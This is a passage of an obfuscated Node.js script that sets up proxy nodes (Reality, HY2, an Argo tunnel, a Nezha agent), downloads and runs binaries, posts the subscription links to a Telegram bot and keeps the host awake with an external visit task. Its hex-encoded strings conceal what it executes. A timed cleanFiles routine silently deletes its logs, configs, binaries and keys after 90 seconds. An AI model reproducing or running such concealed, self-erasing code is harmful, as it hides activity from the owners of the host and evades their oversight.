          ? (console[_0x5ab5cd(_0x34b1c2._0x3e8341)]('Nodes\x20uploaded\x20successfully'), _0x48bc81)
          : null
      } catch (_0x5a2c9a) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x41e1ce = { _0x5c0c94: 0x219, _0x161b55: 0x219, _0x1ba86e: 0x1cc, _0x31ba5d: 0x1cf },
    _0x2cfa08 = { _0x3341b0: 0x26b, _0x56f2b5: 0x275 }
  setTimeout(() => {
    const _0x445493 = _0x35ff,
      _0x4c82c7 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x4c82c7[_0x445493(_0x41e1ce._0x5c0c94)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x4c82c7[_0x445493(_0x41e1ce._0x161b55)](phpPath)
    process[_0x445493(_0x41e1ce._0x1ba86e)] === _0x445493(0x23e)
      ? exec(_0x445493(_0x41e1ce._0x31ba5d) + _0x4c82c7[_0x445493(0x2e1)]('\x20') + '\x20>\x20nul\x202>&1', (_0x3dc580) => {
          const _0x49a76e = _0x445493
          ;(console[_0x49a76e(0x2ec)](), alwaysLog(_0x49a76e(0x288)), console[_0x49a76e(0x26b)](_0x49a76e(0x275)))
        })
      : exec(_0x445493(0x2a2) + _0x4c82c7[_0x445493(0x2e1)]('\x20') + _0x445493(0x2cc), (_0x1ee741) => {
          const _0x11d3fc = _0x445493
          ;(console['clear'](), alwaysLog(_0x11d3fc(0x288)), console[_0x11d3fc(_0x2cfa08._0x3341b0)](_0x11d3fc(_0x2cfa08._0x56f2b5)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x5a7849 = { _0x4ad42e: 0x26b, _0x59cf13: 0x266, _0x12fbcc: 0x2b9, _0x4b1c3b: 0x29a, _0x54d412: 0x1c7, _0x463cf4: 0x264 },
    _0x1fb1e8 = _0x475425
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x1fb1e8(_0x5a7849._0x4ad42e)]('TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG')
    return
  }
  try {
    const _0x5572e3 = fs[_0x1fb1e8(0x1e3)](subPath, 'utf8'),
      _0x3802af = _0x1fb1e8(0x2f2) + BOT_TOKEN + _0x1fb1e8(0x27c),
      _0x14a841 = NAME[_0x1fb1e8(0x1dd)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x1fb1e8(0x2cb)),
      _0x9eca3c = {
        chat_id: CHAT_ID,
        text: '**' + _0x14a841 + _0x1fb1e8(_0x5a7849._0x59cf13) + _0x5572e3 + '```',
        parse_mode: _0x1fb1e8(_0x5a7849._0x12fbcc)
      }
    ;(await axios[_0x1fb1e8(_0x5a7849._0x4b1c3b)](_0x3802af, null, { params: _0x9eca3c }), console[_0x1fb1e8(0x26b)](_0x1fb1e8(0x1c5)))
  } catch (_0x5b8534) {
    console[_0x1fb1e8(_0x5a7849._0x54d412)](_0x1fb1e8(0x25e), _0x5b8534[_0x1fb1e8(_0x5a7849._0x463cf4)])
  }
}
async function AddVisitTask() {
  const _0x1f1542 = { _0x1d90cd: 0x236, _0x7bb583: 0x260, _0x30b142: 0x26b, _0x50b12f: 0x215 },
    _0x555fc2 = _0x475425
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console['log'](_0x555fc2(_0x1f1542._0x1d90cd))
    return
  }
  try {
    const _0x2b255c = await axios['post'](_0x555fc2(0x1ed), { url: PROJECT_URL }, { headers: { 'Content-Type': _0x555fc2(_0x1f1542._0x7bb583) } })
    return (console[_0x555fc2(_0x1f1542._0x30b142)](_0x555fc2(_0x1f1542._0x50b12f)), _0x2b255c)
  } catch (_0xec5061) {
    return (console[_0x555fc2(0x1c7)]('Add\x20automatic\x20access\x20task\x20faild:\x20' + _0xec5061[_0x555fc2(0x264)]), null)
  }
}
async function startserver() {
  const _0x3e3240 = { _0x1084f0: 0x1c7 },
    _0x5d8437 = _0x475425
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x91edd8) {
    console[_0x5d8437(_0x3e3240._0x1084f0)](_0x5d8437(0x270), _0x91edd8)
  }
}
startserver()[_0x475425(0x263)]((_0x55c09f) => {
  const _0x286b8e = { _0x1546c3: 0x27f },
    _0x1b7e73 = _0x475425
  console[_0x1b7e73(0x1c7)](_0x1b7e73(_0x286b8e._0x1546c3), _0x55c09f)
})
const server = http[_0x475425(0x2ee)](async (_0x2dfb63, _0x30915c) => {
  const _0x410291 = {
      _0x1fc093: 0x2c3,
      _0x530242: 0x24e,
      _0x498455: 0x248,
      _0x3b23fb: 0x293,
      _0x58af91: 0x2c3,
      _0x12e9fa: 0x276,
      _0x19c0a8: 0x1d4,
      _0x546cfb: 0x293
    },
    _0x279888 = _0x475425,
    _0x2e15d8 = _0x2dfb63[_0x279888(0x2ef)][_0x279888(0x1f7)]('?')[0x0]
  if (_0x2e15d8 === '/' + SUB_PATH) {
    if (subContent)
      (_0x30915c[_0x279888(0x293)](0xc8, { 'Content-Type': _0x279888(_0x410291._0x1fc093) }), _0x30915c[_0x279888(_0x410291._0x530242)](subContent))
    else
      try {
        const _0x1766e0 = fs[_0x279888(0x1e3)](subPath, _0x279888(_0x410291._0x498455))
        ;(_0x30915c[_0x279888(_0x410291._0x3b23fb)](0xc8, { 'Content-Type': _0x279888(_0x410291._0x58af91) }), _0x30915c[_0x279888(0x24e)](_0x1766e0))
      } catch (_0x38a29f) {
        ;(_0x30915c['writeHead'](0x1f7, { 'Content-Type': _0x279888(0x2c3) }),
          _0x30915c[_0x279888(0x24e)]('Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.'))
      }
    return
  }
  if (_0x2e15d8 === '/') {
    try {
      const _0x1d0c6b = path['join'](__dirname, 'index.html'),
        _0x217750 = await fs[_0x279888(0x274)][_0x279888(0x265)](_0x1d0c6b, _0x279888(0x2aa))
      ;(_0x30915c[_0x279888(0x293)](0xc8, { 'Content-Type': _0x279888(0x276) }), _0x30915c[_0x279888(0x24e)](_0x217750))
    } catch (_0x29b85b) {
      ;(_0x30915c['writeHead'](0xc8, { 'Content-Type': _0x279888(_0x410291._0x12e9fa) }), _0x30915c['end'](_0x279888(_0x410291._0x19c0a8)))
    }
    return
  }
  ;(_0x30915c[_0x279888(_0x410291._0x546cfb)](0x194, { 'Content-Type': _0x279888(0x2c3) }),
    _0x30915c[_0x279888(_0x410291._0x530242)](_0x279888(0x26f)))
})
server[_0x475425(0x28f)](PORT, () => alwaysLog(_0x475425(0x28b) + PORT + '!'))
